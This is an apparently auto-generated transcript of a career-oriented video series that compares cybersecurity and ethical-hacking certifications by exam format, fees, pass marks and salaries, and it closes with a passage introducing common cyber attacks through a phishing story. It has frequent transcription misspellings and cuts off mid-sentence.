this is advanced certification so around
eight years of manageable experience is
suggested before you attempt the core
bit 5 certification to understand all
the aspects and to help you implement
the framework properly the certification
certificate provider is asaka the exam
fee is around 175 dollars now this is a
small exam 50 questions but in 40
minutes so you really have to be on your
toes you have to know the knowledge
there is very limited time to think and
you have to be fast in your answers the
past percentage is 50 percent the job
roles associated with this certification
would be to when you apply for a
information security manager or as a
security consultant or a cyber security
manager and your roles and
responsibilities would be to govern the
an it space that the organization owns
so all the servers desktops the network
the data flows the databases everything
and how it needs to be managed and how
it needs to be governed in a secure
manner annual salaries would be around a
hundred thousand dollars plus then the
cism also called as system it stands for
certified information security manager
and as the name suggests it's a security
manager certification it helps the
candidate in understanding the
relationship between business goals and
information security so now you're going
into the space where you're not only
technical in nature but you also have to
understand the business needs the goals
of the business and you have to align
the information security of your
infrastructure along with the business
needs and the business goals so it is
your inputs that are going to go to the
management to see if the infrastructure
is aligned to the business goals or if
the infrastructure or the business goals
need any fine tuning around five years
of work experience is recommended in the
information security field for
attempting the cism out of the five
years the candidate must have a
background as an information security
manager for three years so you have some
experience as a manager uh you have
implemented those things yourselves
which will give you a better
understanding and then you attempt the
certification again providing by asaka
and the exam fees for asaka memphis is
575 dollars for non-members it is 760
the exam is where you have to answer 150
questions in four hours uh quite a bit
of time but questions are going to be uh
scenario-based questions where they're
going to give you a lot of scenarios you
have to think about it and you have to
give the most probable and the correct
answer for that particular scenario the
past mark is 450 out of 800. your job
profiles would be either a risk manager
or a risk consultant analyzing the
business requirements to the
infrastructure security that that you
have and to identify if there any risks
associated with the infrastructure
highlight those risks and then put in
security controls and manage those
controls in a way where security is
mitigated your average salaries would be
around 88 000 and above then the cisa or
the cisa the certified information
systems auditor certification it not
only looks into security but it also
looks into auditing and controls in
information systems this is a highly
reputed certificate and you gain a
better understanding of governance
regulations and auditing your
information landscape again a minimum of
five years of work work experience in
the field of information systems
auditing control or security is
necessary now here the question would be
what's the difference security is where
you're technical in nature you have done
let's say a vulnerability assessment or
a penetration test you have implemented
firewalls you have architected security
controls are all about the security
controls that you're going to implement
like firewalls idss ipss data loss
prevention systems uh maybe even
utms and whatnot so experience in
architecting or implementing those
controls in an effective manner
mitigating your security or your your
vulnerabilities that you have identified
in the organization and auditing would
basically mean about looking at
compliance to ensure that if everything
is in place you're compliant with let's
say uh iso 27001 guidelines or the
policies that you have created yourself
and everything is working in order so
it's more of a checklist where you're
going to just check everything is in
place and you're conforming to standards
this certification is also provided by
isaka and the exam fees for isaka
members are 575 dollars whereas non saka
members will have to pay 760 dollars for
the certification 150 questions again in
four hours multiple choice questions
scenario based so you have to really
understand this uh real world scenarios
of where what controls and what audit
mechanisms should be in place past mark
is 450 out of 800. your job roles would
be mainly becoming an auditor or a
senior auditor a director for
information security information audit
manager or information technology
consultant where you provide
intelligence on how the company should
implement their infrastructure average
salaries would be 103 000 and above then
comes the crisc also called as krisk
certified in risk and information
systems control certification helps the
candidate design and maintain
information systems controls for an
organization this is one of the most
sought after certifications as far as
risk management is concerned in europe
and in us if you have this kind of
certifications you automatically qualify
for a risk manager or a security risk
manager or a information security
consultant kind of a role you should
have a minimum of three years of
experience in the field of is controls
that means information security controls
you should have knowledge about
firewalls you should know about how to
mitigate risks how to identify risks in
the first place risk analysis risk
management and after which you're going
to implement security controls to
mitigate that risk or bring it to
acceptable levels at this point in time
you will also be responsible to create
policies revolving those risks and how
you want to calculate those risks and
treat those risks in their lifetime
certificate provider again is asaka 575
for issachar members 760 dollars for
non-asaka members for the exam fees a
similar question 150 questions to be
answered in four hours multiple choice
based on performances so they may give
you a scenario where you have to perform
a risk analysis and provide a report and
a solution based on your findings again
the past mark is 450 out of 800. the job
profiles associated as discussed earlier
are the it risk management professionals
where they're going to identify risks
treat those risks calculate analyze
maybe do a business impact analysis to
ascertain how the organization is going
to be affected and then you will also be
looking at compliances as far as these
job roles are concerned average annual
salary would be 119 000 and above moving
on to advanced level certification now
this is where we come across the cissp
or the cis certification certified
information system security professional
this is the gold standard of all
certifications if you have this
certificate it's you can basically be
assured of a job in the id world now
just to qualify you'll have to have five
years of experience in the information
security field there are eight domains
that are specified by cissp and you have
to prove that you have knowledge and
your work experience of around five
years in at least two of those two means
if you do not have those kind of
experiences you can still attempt the
exam but you become an associate of iic
square which means that you get six
years to accomplish the five years of uh
experience requirement for this
certification before taking up the cis
certification is suggested that the
candidate clears all the intermediate
level certifications not all but some of
them in fact i have seen people do the
other way around they qualify for cissp
they give the exam once your cissp the
csa or see some cis or cism exams are
way easier to crack but you need to have
that kind of experience i have seen
people with 15 years of experience and
more
fail at this certification in the first
attempt the certificate provider is ic
square the exam fees is 699
like i said this certification is most
sought after the gold standard in fact
there's hardly any other certifications
after this that you might want to do the
questions now the exam has changed if it
is the english version that you're
giving it's 150 questions to be answered
in three hours if it is the non-english
exam that you're attempting then it is
250 questions in six hours it's a
marathon and if you're opting for the
six hour exam you need to plan it really
well it sounds really easy but the
questions are quite tough the scenario
based and the answers are quite
confusing as well you would get multiple
choice questions you would get drag and
drop and you might get simulators as
well uh the past mark is 700 out of 1000
but each question has a different
weightage so uh it depends on which
questions are asked of you and which
questions you have answered correctly
the job rules associated with this
certification would be anything and
everything in information security at
the managerial level and above so
information security manager risk
manager system uh information system
security officer the cso role the ciso
chief information security officer any
role that you might think of as a risk
from a risk compliance strategy could be
achievable after this kind of a
certification the average annual salary
is 108 000
for this certification first let me
briefly introduce comptia before moving
on to the comptia security plus
certification
the computing technology industry
association or better known as comptia
is a leading vendor-neutral i.t
certification provider in the world
comptia is considered one of the top
trade associations
its vendor neutral certification program
is undoubtedly one of the best in the
iit industry
for more than two decades comptia has
developed certification exams and
training for networking security open
source development and cloud to name a
few
comptia certifications continue to
address the requirements and necessities
of today's technology challenges
comptia certifications are grouped by
skill set presently comptia
certifications are classified into four
areas core infrastructure cyber security
and additional professional
certifications
if you have a job that may involve some
sort of certification you must consider
obtaining that certification
certifications are very crucial comptia
certifications are a way for it
professionals to demonstrate their
knowledge of computers
let us now have a look at a few of the
certifications offered by comptia
first we have comptia a plus
comptia a plus certification is an entry
level certification for it technicians
this certification is designed for
employees who are seeking a career as a
support service center or networking
technician
this certification tests a candidate's
understanding of basic networking
troubleshooting and security skills
it covers laptop and pc hardware
software installation and configuration
of operating systems
according to comptia more than one
million it professionals hold the a plus
certification
next we have comptia network plus
you can either start with the a plus
certification however if you have the
experience you can move directly to the
comptia network plus certification
this certification is for professionals
who carry a minimum of nine months of
networking experience
here a candidate must be familiar with
networking technologies topology
security installation and configuration
and troubleshooting of wireless and
wired network devices
next we have comptia security plus
comptia security plus covers network
security concepts threats and
vulnerabilities access control identity
management cryptography and much more we
will closely look at the comptia
security plus certification in this
video and finally this comptia cloud
plus
the comptia cloud plus certification
finds its importance as the cloud
computing market continues to grow by
leaps and bounds
this certification targets it
professionals with two to three years of
experience in storage networking or data
center administration
the certification exam tests the
candidate's knowledge of cloud
technologies cloud markets and hybrid
and multi-cloud solutions
those were a few of the certifications
offered by comtia there are several
other certifications like comtia linux
plus comptia pentest plus and comptia
project plus to name a few
now let us have a look at the comtia
security plus certification in detail
so what is the comptia security plus
certification
well the comptia security plus
certification is a leading entry
entry-level it certification it is an
essential certification for
professionals working in the it industry
it is one of the first security
certifications that must be earned by it
professionals
it provides the core knowledge required
of any cyber security role and provides
a spring boot of various intermediate
level cyber security jobs
this certification teaches you how to
secure applications devices and networks
it also focuses on hands-on practical
skills in the field of network security
the certification teaches you skills
from spotting and mitigating risks to
troubleshooting security incidents
it is to be noted that id professionals
with comptia security plus know how to
address security incidents and not just
identify them
so now that you know what comptia
security plus certification is about let
us look at a few points as to why a
professional must choose this
certification
the first reason being it's a vendor
neutral certification
the comptia security plus certification
is vendor neutral which implies that you
don't have to center on technology and
security of a precise vendor the skills
and knowledge achieved through this
certification make security
professionals and network administrators
become in demand in the iit marketplace
the comptia security plus certification
is globally acknowledged to be one of
the fundamental security certifications
in the field of cyber
comptia security plus certification is
universally recognized and trusted
across the world
security plus provides hands-on skills
one of the few entry-level cyber
security certifications that emphasizes
on hands-on practical skills
this ensures a security professional is
better prepared to solve several complex
issues of the current times
the comptia security plus certification
is aligned with the latest techniques
and trends it covers core technical
skills in risk assessment and management
incident response foreign sex and cloud
operations to name a few
thereby ensuring high performance on the
job
having this security certification
provides you a wider breadth of career
opportunities
the comptia security plus exam is
performance based which makes the
knowledge and skills learned more
applicable
there are numerous job roles that turn
to security plus to supplement baseline
cyber security skills
cyber security professionals are in
demand by organizations from both
private and public areas
with this certification you can take up
jobs related to compliance and
operational security threats and
vulnerabilities access control and
identity management and cryptography to
name a few
it is to be also noted that
professionals with the security plus
certification have greater opportunities
of receiving higher salaries than
non-certified professionals
another benefit of this certification is
that if you wish to get a cyber security
government job obtaining the comptia
security plus certification will be an
ideal starting point for you
so now that you know the perks of
achieving this certification what you
have to do to achieve this well before
you can achieve this certification you
have to clear the comptia security plus
exam
let us now have an overview of the
comptia security plus exam
first and foremost
who can take up this exam although
comptia does not have any set
prerequisites organizations recommend
that candidates meet these two criterias
let's have a look at the two criterias
firstly the comptia security plus is for
it professionals who carry a minimum of
two years of experience in the it
administration focusing on security
the comptia security plus is ideal for
professionals who are looking to start
or advance a career in security
obtaining this certification prepares
the professionals for job roles like
system administrator security
administrator network administrator
junior penetration tester security
engineer and security consultant to name
a few
though comptia security plus is an entry
level certification it is strongly
recommended that you get the a plus and
network plus credentials before
proceeding to the security plus
certification
this will ensure that you have the
required technical skills like
configuring managing and troubleshooting
networks
now let's move on and understand the
comptia security plus exam details
comptia security plus
sy-0601 is the latest exam code that was
launched on 12 november 2020
the
sy00501 english language exam retires on
31st july 2021 hence we recommend you to
opt for the
sy-0601 exam
there are a maximum of 90 questions
comptia security plus exam has multiple
choice questions but some comptia
certification exams include
performance-based questions or pbqs
performance-based questions test the
candidate's ability to solve problems in
a simulated environment
the passing score for this certification
exam is 750 on a scale of 100 to 900.
the duration of the exam is 90 minutes
so time management is crucial to clear
the exam since you need to solve each
question within a minute
comptia security plus
sy-0601 exam is currently available in
english and japanese language you can
enroll for the exam by booking a slot
online or registering with pearson view
testing centers
the price of the comptia security plus
certification exam is 370 us dollars in
australia the price is 500 australian
dollars and in european currency it is
334 euros
let us now look at the focus areas of
comptia security plus exam
firstly this exam focuses on the core
cyber security skills required of any
cyber security role such as security
incident handling and response intrusion
detection malware prevention etc
the second area of focus is threats
attacks and vulnerabilities this
includes analyzing indicators of
compromise and determining types of
malware or comparing and contrasting
types of attacks
next up we have identity and access
management
this topic emphasizes on implementing
identity and access management controls
or differentiating common account
management practices
the fourth domain that comptia security
plus focuses on is risk management this
domain describes the importance of
policies plans and procedures related to
organizational security
finally we have cryptography and pki
here the exam deals with questions
related to comparing and contrasting
basic concepts of cryptography and
implementing public key infrastructure
another key focus area of this exam is
how to troubleshoot common security
issues and deploy mobile devices
securely
now coming to the final section of this
video where we look at the important
skills that you will acquire after
completing the comptia security plus
certification exam
first you will learn to detect various
types of compromise and understand
penetration testing and vulnerability
scanning concepts
this certification will give knowledge
to assess the security posture of an
enterprise network and recommend and
implement appropriate security solutions
you will also get an idea of installing
configuring and deploying network
components while assessing and
troubleshooting issues to support
organizational security you will gain
the desired skills to monitor and secure
hybrid environments including cloud
mobile and iot
comptia security plus certification
exams give the experience to install and
configure identity and access services
you will understand how to identify
analyze and respond to security events
and incidents
finally you will grab another crucial
skill that is to implement best
practices on risk management
comptia security plus certification will
make you understand how to implement and
summarize risk management best practices
and the business impact
it ensures you operate with an awareness
of applicable laws and policies
including the principles of governance
risk and compliance
that was all about the comptia security
plus exam taking up this exam will help
you learn a lot about cyber security and
acquire the necessary skills that will
help you become a greater cyber security
professional
this is why organizations look for
professionals with comptia certification
this certification is evidence of your
expertise in the security field comptia
security plus certification is prevalent
among security professionals although
the exam requires a lot of hard work to
crack the reward is very fruitful
all the best to everyone who wishes to
be comptia security plus certified let
us understand the importance of the ca
certification before getting to know
about its content
so why should you take up the ch version
11. the certified ethical hacker is the
most trusted ethical hacking
certification and a recommended one by
employers around the globe
since the introduction of the ca
certification in 2003 it is globally
recognized as a standard within the
information security field the ch
version 11 by ec council continues to
keep up to the standard and it
familiarizes the latest hacking
techniques and teaches you advanced
hacking tools and exploits used the ch
version 11 aligns with the current cyber
security market requirements and adds
the latest advancements in the
cybersecurity field
the ca certification helps and trains
you to think like a hacker and this in
turn helps you beat a hacker and defend
your network after obtaining the ca
certification you'll be a certified
ethical hacker a certified ethical
hacker is a skilled professional working
in a red team environment who safeguards
networks and understands attack
strategies and mimics the skills of
malicious hackers certified ethical
hackers discover vulnerabilities in a
system and operate with permission from
the system owners only
so who can become a certified ethical
hacker and who can take up the ca
certification let us have a look at that
now
in the first case to be eligible for the
ca certification exam you need to attend
the official training from authorized ec
council training partners it can be an
online training or tutor-led training
from easy council learning partners only
then are you eligible to take up the ca
certification exam
so a candidate who has completed an
official ec council training is eligible
to take up the exam without going
through the application process
or in the second case in order to be
considered for this credential you need
to have at least two years of work
experience in the information security
domain and you must pay a non-refundable
application fee and submit an
eligibility application form
once it is approved you can take up the
ch exam
after the application is approved you
can purchase the test voucher
in the latest version of the ceh we will
see the addition of various core
concepts moving on to our next topic let
us see how different the ch version 11
is and few of its objectives
firstly it outlines ethical hacking
concepts cyber kill chain concepts and
overview of information security and
various laws and regulations related to
information security this certification
briefs you about the faces of system
hacking attacking techniques and how you
can maintain access
it also briefs you about footprinting
concepts and ways of utilizing
footprinting tools along with necessary
countermeasures
the next objective is to familiarize
with vulnerability assessment along with
the hands-on experience of various
scanning tools
next we have cyber security threats like
malware threats analysis of various
worms viruses and trojans various
malware concepts packets sniffing
concepts and techniques have been
introduced into this domain
it also highlights the concepts related
to social engineering denial of service
attacks sql injection and aviation
techniques
it also speaks about wireless hacking
concepts and mobile device management
the concept of operational technology is
a new addition this time
next is getting acquainted with security
solutions like firewalls honeypots ips
their evasion and protection
our fifth point is knowing various
topics in cryptography like encryption
algorithms public key infrastructure and
cryptanalysis
moving on the next objective is to
incorporate padded security os as it
offers better performance on lower
powered laptops and machines when
compared to kali linux
next is to learn to recognize and deal
with iot based vulnerabilities and
attacks with the ch version 11 course
that covers the latest iot hacking tools
you would be required to ensure the
safety of iot devices
our next point is with respect to the
evolving cloud industry you would need
to learn how to identify and defend
cloud-based threats and attacks
the latest version of ch includes new
operating systems and windows 10
configured with domain controller and
vulnerable web applications for
improving hacking skills
finally what is different is that more
than 50 percent of the ch version 11
course is dedicated to practical skills
in live ranges by our ec council labs ec
council leads in this aspect of the
industry now that we saw the ch exam
objectives let us look into the ch exam
topics weightage
as you see on your screens this is a pie
chart with nine domains in ch along with
their weightages
you can prepare for your exam
accordingly
let us move on and take a closer look at
each of these domains their respective
subdomains and their descriptions
our first domain is information security
and ethical hacking overview
this domain consists of questions from
information security cyber kill chain
concepts ethical hacking concepts
various hacking concepts and information
security laws and standards
you can expect a total number of eight
questions from this domain the weightage
of this section is six percent
the second domain is reconnaissance
techniques
under the subdomains we have
footprinting and reconnaissance at first
this covers various topics like
footprinting concepts footprinting
methodology email footprinting
footprinting through web services dns
footprinting footprinting through social
engineering etc
the next subdomain in this section is
scanning networks
scanning networks covers various
concepts like scanning tools host
discovery port and service discovery os
discovery draw network diagrams scanning
beyond ids firewall etc
and our third subdomain under
reconnaissance techniques is enumeration
various topics like snmp enumeration ntp
and nfs enumeration smtp and dns
enumeration and enumeration counter
measures are covered under this
subdomain a total of 26 questions will
be asked from this domain under
footprinting and reconnaissance you will
have 10 questions and under scanning
networks and other 10 and finally under
enumeration you'll have 6 questions a
total weightage of 21
is given to this particular topic
our third domain is system hacking faces
and attack techniques under our third
domain our first sub-domain is about
vulnerability analysis this sub-domain
covers topics on vulnerability
assessment vulnerability classification
vulnerability assessment solutions and
tools and various vulnerability
assessment reports our next sub domain
is about system hacking you have
concepts like gaining access cracking
passwords vulnerability exploitation
escalating privileges maintaining access
covered under this subdomain and finally
we have malware threads under this
domain malware threads incorporate
concepts like apt concepts trojan
concepts virus and worm concepts malware
analysis and so on a total of 21
questions will be asked from this domain
under vulnerability analysis there will
be 9 questions asked system hacking and
other 6 questions and finally under
malware threats you will have 6 other
questions asked
that sums up to a total 21 with a
weightage of 17 for this domain
our fourth domain is about network and
perimeter hacking
here you have various sub domains and
one of it is social engineering under
social engineering you will be asked
questions based on social engineering
techniques insider threats impersonation
on social networking sites identity
theft and so on you'll also have various
question on the sniffing concepts as it
is another sub-domain
you can also expect questions from the
denial of service subdomain here
questions related to botnets and ddos
attacks will be asked
various session hijacking concepts are
another crucial part of this domain
the final subdomain is about evading ids
firewalls and honeypots
here various concepts on ids ips
firewall and honeypots are covered you
will need to understand how to evade ids
and firewalls and how to detect
honeypots a total number of 18 questions
will be asked from the fourth domain
that was network and perimeter hacking
and the weightage for this domain is 14
our fifth domain is about web
application hacking and our first sub
domain in it is hacking web servers
this incorporates concepts related to
web server attacks web server attack
tools patch management and so on
the next subdomain is about hacking web
applications here you have various
concepts related to bypass client-side
controls analyze web applications
footprint web infrastructure attack
access controls and how to perform
injection attacks and so on
finally under the sql injection
subdomain you will have questions based
on sql injection the types of sql
injection the sql injection methodology
sql injection tools aviation techniques
and sql injection counter measures
here a total of 20 questions will be
asked from this domain
and that is a weightage of 16 percent
will be given to the web application
hacking domain
our sixth domain is solely devoted to
wireless network hacking
this domain focuses on hacking wireless
networks various wireless concepts
wireless encryption wireless threats
wireless hacking tools various hacking
methodologies bluetooth hacking and
wireless counter measures are covered a
total of eight questions will be asked
from this domain with a weightage of six
percent
our seventh domain is all about mobile
platform iot and ot hacking our first
subdomain here is hacking mobile
platforms
here the concepts that are touched upon
our mobile platform attack vectors
hacking android os hacking ios mobile
device management and mobile security
guidelines and tools
our next sub domain here is about iot
and ot hacking which covers concepts on
iot hacking tools its methodologies
counter measures and it also speaks
about ot concepts ot attacks ot hacking
tools and ot counter measures
you have a total of 10 questions asked
from this domain with a weightage of 8
percent the next domain is very
interesting and it is all related to
cloud the cloud computing domain covers
concepts based on cloud computing
serverless computing cloud computing
threats cloud hacking and cloud security
the weightage given to this domain is 6
with the total number of questions of
seven and finally we have cryptography
as our ninth domain
as the name suggests this domain covers
topics based on cryptography concepts
encryption algorithms cryptography tools
public key infrastructure email
encryption disk encryption crypt
analysis and counter measures
and seven questions will be asked from
this domain with a weightage of six
percent now that you saw the ch exam
topic's weightage let us have a closer
look at the ch exam details let us first
have a look at the ch exam based on mcqs
the exam title is certified ethical
hacker with the exam code of 312-50
this exam will have 125 questions with a
time limit of 4 hours the test format is
multiple choice questions
the pass percentage varies ideally
between 60 to 85 percent now let's have
a look at the ch practical exam details
in order to gain the ch master
recognition it is mandatory that you
take up the ch practical exam as well
the exam title is certified ethical
hacker practical and this practical exam
will have 20 questions with a duration
of 6 hours
the exam format will be ilab cyber range
and finally the passing score for the ch
practical exam is at 70 percent after
clearing both the mcq based exam and the
practical exam you can get the ch master
recognition now that we had a look at
the ch exam details let us have a look
at the career prospects for a
professional with this certification
having the ch certification guarantees
that you have an insight into the
hacking world hence companies want to
hire professionals who can think like a
hacker and safeguard their networks and
systems
a candidate with the ca certification
can apply for various cybersecurity job
roles such as penetration tester
security engineer and information
security analyst from the long list
according to pay scale the annual
average salary of a ch professional in
india is rupees 5 lakhs per annum
meanwhile in the united states a
professional holding the ca
certification earns nearly 93 000 on an
average basis annually now that you had
a look at the ch version 11
certification and its career prospects
what are you waiting for get certified
with simply learn and back that ca
certification so let's start looking at
the certifications so to be an ethical
hacker you must hold a certification
which specializes in ethical hacking or
in cyber security companies look for
candidates who are globally certified
when we say globally certified they're
looking for a certificate that has been
given by an organization that is
recognized globally and is well accepted
in the industry so these are the top
five certifications a candidate can
obtain the first one become a certified
ethical hacker then there is global
information assurance certification
penetration tester then offensive
security certified professional comptria
pentest plus and finally the license
penetration tester now these
certifications are offered by different
organizations all of these organizations
are recognized globally and their
certifications are well accepted in the
technical space so let's start off with
the certified ethical hacker and we'll
look at the organizations that provide
these certifications and how we can
attain them so ceh or certified ethical
hacker in its current form is in its
version 10 it's been revised and updated
over a period of time ec council is the
certifying authority for ceh they have
their own authorized training centers
through which you can attend trainings
give those exams get yourself certified
and thus become globally certified and
can be eligible to apply for security
related jobs it is a very well known
certification and is widely accepted at
the same time it would test the
candidates knowledge of security threats
and preventive measures now there are
two types of exams that you can give
with ceh one is a multiple choice
question exam which is theoretical in
nature they ask you questions and you
answer the correct uh you'd select the
correct answers if you're clear you get
certified the second certification
nowadays is where there's a practical
exam associated with it that's a you'll
have to purchase the voucher for that
exam and give that exam the practical
exam is held in a virtual lab where they
you're given scenarios and based on
those scenarios you have to resolve the
questions given to you and give proof of
the resolution which would then
get you certified as an ethical hacker
the theoretical exam in this scenario is
the fees is around five hundred dollars
this is for the multiple choice question
exam
where you can pay the fees and you can
attend through uh
online portal and he can give the exam
directly the exam is four hours long in
which you have to answer 125 questions
now four hours for 125 questions seems a
long time but it isn't it's a very
technical exam there are scenario-based
questions and it would take some time
for you to analyze and understand the
question and then identify the
equivalent correct answer so it's a very
competitive exam and you'll have to
study really hard to clear this exam as
well the cutoff for passing varies from
60 to 85 percent so there is no exact
grade and all the questions have
different weightages so depending on the
questions that have been given to you
and the way that you have answered them
you would pass at either 60
or you would pass when you scored 85
percent once you are ceh certified which
is a very technical certification you
will be qualified to apply for job roles
as a penetration tester or a security
engineer these are job roles where you
would be responsible of ethically trying
to attack applications
servers switches and try to find out
vulnerabilities within them the training
of this certification will make you
adept in most of these tools that are
required there are a lot of practicals
in this
training and if you successfully
completed those practicals clearing the
exam is a easy task with the practicals
comes your knowledge and would help you
understand how you would be performing
penetration tests in the real world an
average annual salary in the usa for a
cea certified person is around 91 000
and in india is around 4 like 76 000 odd
rupees the salaries would vary as far as
organizations are concerned uh more
established organizations can afford to
pay a little bit more but these are
average salaries that we have seen
across the market the next certification
is the g pen also known as the global
information assurance certification
penetration tester this certification
looks into the different pen testing
practices and methods also focuses on
the various problems and pen testing so
again this is where you're getting
certified as a penetration tester so
it's again a technical certification
where your knowledge on networking
applications and security of which will
be tested you will be trained on this of
course so the training will include all
these areas where you need to focus
identify those problems and thus be
ready for the real world scenarios the
candidate will have to understand
networking concepts and operating
systems such as linux and windows and
you should be very well aware of the tcp
protocols this is true for any of the
technical certifications for ethical
hacking giac is the certification
provider it's again a very well renowned
and well accepted certification
authority across the globe the exam fees
are 1800
82 215 questions to be answered in three
hours now why 82 215 it depends on the
test that has been associated and
depending on how you're answering those
questions
you would be given those many number of
questions to begin with but all of these
need to be answered in three hours 74 is
the past percentage that is required to
clear this exam the average annual
salary in the usa is around 96 000
while in india it is around similar to
certified ethical hacking then looking
at the next certification from offensive
security called the oscp
offensive security certified
professional this is another penetration
testing certification highly technical
in nature and it is an entirely hands-on
certification the previous two
certifications that we saw we talked
about ceh where there are two different
exams you could either take the
theoretical exam and give your mcqs or
you could take the practical one here
you don't have an option this is a
practical exam so the test is conducted
on a virtual network so they send out
instructions to you there's a virtual
lab that is given out to you and they
give you the questions and you have to
perform those assessments create those
reports and provide it to the certifying
authority in this case offensive
security
if you match their criterias of whatever
you have identified in those reports you
get certified here the requirements of
good understanding of networking
protocols how systems function how kali
linux operating system functions and the
candidate must for complete offensive
securities penetration testing with the
kali linux course and pass the hands-on
exam so this focuses purely on kali
linux kali linux is an operating system
that is freely distributed over the
internet and comes structured with
around 300 plus tools used for ethical
hacking so this course totally relies on
kali linux for you to use as a tool set
for penetration testing the certificate
provider as stated is offensive security
the name of the course is oscp offensive
security certified professional exam is
around 800 to
1550. now understand that this exam is
technical and is hands-on so for you to
prepare for this exam they come up with
virtual labs where you can start
practicing and honing your skills
depending on the number of days for
which you have purchased the access to
that particular labs the amount will
vary from eight hundred dollars which
would be the minimum access days
available to 1550
where the maximum number of days would
be given to you for practicing once you
are ready even during the times per time
span of where you have that access once
you are ready for the exam you can you
can attempt the exam and clear the
average annual salary is similar around
ninety one thousand dollars for the u.s
market and nine hundred and five
thousand rupees in the indian market
then looking at the comchia pen test
plus comptia is another certification
authority or a certification provider a
training provider that that will help
you get yourself certified in the
ethical hacking space so they have
certification called pen test plus which
is focused towards penetration testing
so it is an intermediate level
certification it assesses the
vulnerability assessment and the
penetration testing skills of a
candidate here the training will provide
you with all the essentials where it
will help you identify how to do
vulnerability assessments how to
identify those vulnerabilities and then
which tools to utilize for what kind of
a penetration test for the requirements
a minimum of three to four years of
hands-on experience in the information
security field also a computer security
plus or a network plus or equivalent
knowledge is required so in the network
plus they talk about securing networks
and they help you understand the osi
layers the tcp layers and help you
understand the protocols and all of
those things so having that knowledge is
an added advantage the certificate
provider is comchia and the cost of the
exam is around 349 dollars maximum
number of questions
is 85 and i think it's a three hour exam
the passing percentage is uh scoring 750
marks out of a possible 900. so the
scale is the minimum you can ever score
is 100 if you're completely unbe
prepared the maximum you can score is
900. uh you get a leeway of 150 marks
for your certifications so you have to
score a minimum of 750 to clear the exam
average annual salary for a hampshire
certified penetration test plus
professional is 97 000 in the u.s market
and in the indian market it would be
around 5 lakh rupees then comes the
license penetration tester now this is
an advanced certificate again from ec
council this is where ac council gives
you a license which certifies that you
have undergone thorough training and
have cleared your exam in which you can
conduct or lead a audit for
vulnerability assessment and penetration
testing it is an expert level
certification comes after the ceh
certification it is the ultimate test
which tests this candidate's penetration
testing skills so there are two
certifications over here one is the ecsa
ec council certified security analyst
once you clear that you get you can
appear for the license penetration
tester both of these are hands-on
certifications so you will be given a
virtual lab you will be given a scenario
in which you'll have to perform some
assessments create reports submit it to
the ec council they will analyze your
reports if they meet the criteria that
have been identified you would then be
certified as a licensed penetration
tester the candidate must be above 18
years of age a recertification is
required every three years so the
validity is three years after three
years you will have to be recertified or
there is a continuing point education
system over there where you can score
points by publishing articles by
attending trainings or giving out
trainings and you can get yourself
re-certified it is preferred that the
candidate has ceh and the ecsa
certification so the previous
certification that we saw certified
ethical hacker and then the ecsa ec
council certified security analyst after
which you can appear for the lpt license
penetration tester the certificate
provider again is ec council the license
penetration tester exam has a different
process the candidate must purchase an
exam dashboard for 899 dollars which is
valid for a year so once you purchase
the voucher the validity is one year you
can prepare within that one year and
then give the exam and attain the
certification only once you are ready
the exam can be scheduled and you can
give that exam the exam consists of
three different levels each level has
three different challenges the candidate
must pass at least one challenge in
order to qualify for the next level and
for each level the exam is six hours so
this is a grueling exam this is hands-on
they're giving you challenges and they
are going to test you on your skills as
a penetration tester so be ready to be
very hands-on for this kind of a
certification average annual salary in
the us is around 100 000 and above and
in india 825 000 and above meet anne
she often shops from
www.shoppingcart.com
she has her information like email id
address and credit card details saved on
the website to enable a faster and
hassle-free shopping experience
the required information is stored in a
server
one day anne received an email which
stated her eligibility for a special
discount voucher from shoppingcart.com
in order to receive the coupon code she
was asked to fill in her
shoppingcart.com account credentials
this didn't seem fishy to her at the
time as she thought it was just an
account verification step
little did she realize the danger she
would be facing
she was knocked off her feet when a
substantial amount of money was wiped
off her account
how do you think this happened
well yes the email she received was fake
anne's shoppingcart.com account
witnessed unauthorized access from a
third party this type of attack is known
as a cyber attack and the person who
carries it out is called a hacker
could anna prevented this attack
indeed she could have
with the help of cyber security
cyber security involves techniques that
help in securing various digital
components networks data and computer
systems from unauthorized digital access
there are multiple ways to implement
cyber security depending on the kind of
network you are connected to and the
type of cyber attacks you are prone to
so let's take a look at the various
cyber attacks that anne could have been
exposed to
one of the most common types of cyber
attacks is a malware attack like trojan
adware and spyware to name a few
had anne downloaded any suspicious
attachments online her system could have
gotten corrupted by certain malicious
viruses embedded within the attachments
next is a phishing attack the type of
cyber attack which ann experienced
here the hacker usually sends fraudulent
emails which appear to be coming from a
legitimate source
this is done to install malware or to
steal sensitive data like credit card
information and login credentials
another type of attack is the man in the
middle attack
here the hacker gains access to the
information path between ann's device
and the website's server the hacker's
computer takes over anne's ip address by
doing so the communication line between
ann and the website is secretly
intercepted
this commonly happens with unsecured
wi-fi networks and also through malware
password attack is one of the easiest
ways to hack a system
here and's password could have been
cracked by using either common passwords
or trying all possible alphabetical
combinations
to prevent future cyber attacks and
sought to implement a few cyber security
practices
first she installed a firewall as the
name suggests it is a virtual wall
between ann's computer and the internet
firewalls filter the incoming and
outgoing traffic from your device to
safeguard your network and they can
either be software applications or
hardware reinforcements
secondly and implemented honeypots just
like how flowers attract bees dummy
computer systems called honeypots are
used to attract attackers
these systems are made to look
vulnerable in order to deceive attackers
and this in turn defends the real system
in addition to these she also decided to
use unique alphanumeric passwords
antivirus software and started avoiding
males from unknown cinders
that was ann's story
cyber attacks are not just confined to
individuals but also to public and
private organizations
the cyber attacks carried out in such
places are more deadly and they result
in colossal losses
motives of such attacks are many
starting from tampering with crucial
data to monetary gains
let's have a look at a few of the cyber
attacks that companies are subjected to
various public sector organizations and
large corporations face the advanced
persistent threat apt
in this form of attack hackers gain
access to networks for a prolonged
period in order to continuously gain
confidential information
companies also witness the denial of
service attack where networks are
flooded with traffic which in turn
leaves legitimate service requests
unattended a variant of this is the
distributed denial of service ddos
attack when multiple systems are used to
launch the attack
when a hacker manipulates a standard sql
query in a database driven website it is
known as a sql injection attack by doing
so hackers can view edit and delete
tables from databases
amidst a plethora of cyber attacks it is
indeed a challenge for organizations
with several networks and servers to
ensure complete security this is not an
easy task and to help with this cyber
security professionals are hired to work
on identifying cyber threats and
securing a company's network
there are multiple job roles in the
field of cyber security if hacking
fascinates you then the role of an
ethical hacker is something to be
explored
such professionals try to a network's
vulnerabilities just like how a hacker
would do
but only to identify those
vulnerabilities and resolve them for
protection against an actual cyber
attack
but if you are looking to design robust
security structures then the role of a
security architect is more apt
a chief information security officer
ciso plays a crucial role in enterprise
security and is entrusted with the
overall safety of the information in an
organization with the increase in the
production of global digital data it is
anticipated that cyber attacks will
